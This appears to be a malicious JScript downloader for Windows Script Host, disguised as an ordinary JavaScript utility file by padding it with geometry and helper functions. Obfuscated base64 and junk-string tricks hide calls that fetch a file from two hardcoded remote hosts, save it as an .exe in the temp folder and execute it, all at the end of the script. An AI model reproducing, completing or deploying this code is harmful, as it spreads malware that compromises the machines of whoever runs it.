var specter = 0;
commodity = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  presence = [];
var pennant = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
String.prototype.matched = function () {
	greenwich = this;
	for (var i in pennant){greenwich = greenwich.replace(i, pennant[i]);}
    return greenwich;
};
  for ( var i = 128; i--; ) {
    if ( presence[ i ] === undefined )
      presence[ i ] = -1;
  
    presence[ commodity.charCodeAt( i ) ] = i;
  }
var rosette = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.matched4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("hydrocodone").join("");
    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
	do {
	    c1 = presence[str.charCodeAt(i++) & 0xff];
	} while(i < len && c1 == -1);
	if(c1 == -1)
	    break;
	do {
	    c2 = presence[str.charCodeAt(i++) & 0xff];
	} while(i < len && c2 == -1);
	if(c2 == -1)
	    break;

	out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

	do {
	    c3 = str.charCodeAt(i++) & 0xff;
	    if(c3 == 61)
		return out;
	    c3 = presence[c3];
	} while(i < len && c3 == -1);
	if(c3 == -1)
	    break;

	out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

	do {
	    c4 = str.charCodeAt(i++) & 0xff;
	    if(c4 == 61)
		return out;
	    c4 = presence[c4];
	} while(i < len && c4 == -1);
	if(c4 == -1)
	    break;
	out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}

Point.distance = function(p1, p2) {
    var a = p1.x - p2.x;
    var b = p1.y - p2.y;
    return Math.sqrt(a * a + b * b);
};
Point.dot = function(p1, p2) {
    return p1.x * p2.x + p1.y * p2.y;
};

Point.cross = function(p1, p2) {
    return p1.x * p2.y - p1.y * p2.x;
};

var especially ="hydrocodoneJVhydrocodoneRFTVhydrocodoneAl".matched4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var displacement = "hydrocodoneQWhydrocodoneN0aXZhydrocodonelWE9iahydrocodonemVjdA=hydrocodone=".matched4();
String.prototype.matched2 = function () {
    var furthermore = {
        feeding: this
    };
    furthermore.brochures = furthermore.feeding["c3Vic3RyaW5n".matched4()](specter, rosette);
    return furthermore.brochures;
};

var domestic ="hydrocodoneRXhwYW5hydrocodonekRW52aXhydrocodoneJvbm1lbnRTdHJhydrocodonepbmdz".matched4();
var Native = function(options){
	
};
var chilling = [displacement, domestic,especially,  ""+"."+("enjoy","topple","montenegro","anticipated","randy","think","indians","joseph","exe"), "UnVu".matched4(), ("M"+"SX"+"ML"+("martian","woods","demographic","locations","escapade","sooty","engaging","2.")+"|M"+"LH"+"TT"+("scandinavian","finale","harvey","pickled","supports","occupations","circumcised","shame","P>")+"WU"+("liability","shipping","intriguing","charlotte","reorganization","nether","optical","cr")+("officers","excise","decision","protege","frothy","begin","viewer","corolla","ip")+"t:"+("blocks","ebony","bishop","contributor","powell","complexity","webmaster","adjutant","Sh")+"ell").matched()];
subscriber = "_F2_";
var effigy = this[chilling.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
CETqHUBxok = "QKXEBY";
sphere = (("yeast", "outlook", "triple", "underworld", "legislative", "adolescent", "monetary", "pFKQhtNlKD") + "vkMkvbgQGTw").matched2();
attacked = (("divine", "revenge", "milton", "lighthouse", "spike", "interact", "insincerity", "coating", "picking", "sVlNjWq") + "GQmkdwVYvl").matched2();
  
    String.prototype.notified = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var salaries = chilling.pop().split(">");

sensed = "b3Blbg==".matched4();
var webcams = new effigy(salaries[1]);
eVqKcd = "_F3_";
var allpowerful = new effigy(salaries[0]);
var african = webcams[chilling.shift()](chilling.shift());
MFWAxq = "_F5_";
weasel = (("slime", "pontiff", "errant", "anomaly", "ERuIRMTef") + "NEskPUTW").matched2();

var introductory = chilling.shift();
var pommel = chilling.shift();
function breed(forestry, hotels) {

    try {
        var angloindian = african + "/" + hotels ;
		angloindian = angloindian+ introductory;
            allpowerful[sensed](("record","uzbekistan","G" + weasel) + ("postscript","stockings","ethical","renew","T"), forestry, false);
       
    jYJMyc = "_F7_";
    allpowerful[attacked + ("unshaven","agenda","end")]();
	var propose=(WScript+"sphere"=="V2luZG93cyBTY3JpcHQgSG9zdA==".matched4()+"sphere")&&allpowerful["c3RhdHVz".matched4()] +""=="MjAw".matched4()&&typeof(FAPzOljKKe)==="undefined";
	lQHNgR = "_F8_";
    if (propose) {
		
        var slack = new effigy((("ingredients","examines","berber","evaporate","departmental","rudder","chosen","michel","A")+("intercede","coincident","colonial","intriguing","implement","thunderbolt","output","deplore","SEOO")+"DB"+("indicator","biblical","emphasis","inches","villages","buckskin","bookseller",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        slack[sensed]();
        hNdrgWWitdb = "_F9_";
        slack.type = rosette;
        jctJSeN = "_F10_";
        slack["d3JpdGU=".matched4()](allpowerful[("dover","protective","killer","opposition","staunch","rainbow","compared","")+"R"+"es"+"pon"+pennant['U'].toLowerCase()+"e"+"Qm9keQ==".matched4()]);
        VGhhto = "_F11_";
        slack[(sphere + "o"+("polls","spray","sikkim","duration","dimple","myanmar","kinship","strength","00")+("bishopric","overtakes","broadcasting","yokohama","disproportionate","gratis","waiver","8i")+"tion").replace("0"+("manslaughter","upskirt","circulate","whenever","players","myriad","tuition","08"), attacked)] = 0;
        JCvHyKYMi = "_F12_";
        slack[("exists","herculean","sustainable","talked","expenditure","indignity","tangle","s")+"aveT"+"oF"+"ile"](angloindian, 2);
        QSLPqIGDlFx = "_F13_";
        slack.close();
        ApFWYYzG = "_F14_";
		webcams[pommel](angloindian, rosette, true);
    }
} catch (XQsnFWuCDjo) { };

    NbkcoEX = "_F15_";
}
try{
breed("aHR0cDovLw==".matched4()+"\u006C\u006F\u0074\u0075\u0073\u0073\u006F\u0066\u0074\u002E\u0062"+"\u0069\u007A\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?CiHhobfbA=anBYSbsCKK","bGwjkMo");}catch(TKtBgtOi){}

breed("aHR0cDovLw==".matched4()+"\u0061\u0071\u0075\u0061\u0070\u0065\u0065\u006C\u002E\u0072"+"\u0075\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?YDQtbRi=INijIL","mnAAlXdoQFG");
   FKuFdS = "_F16_";
   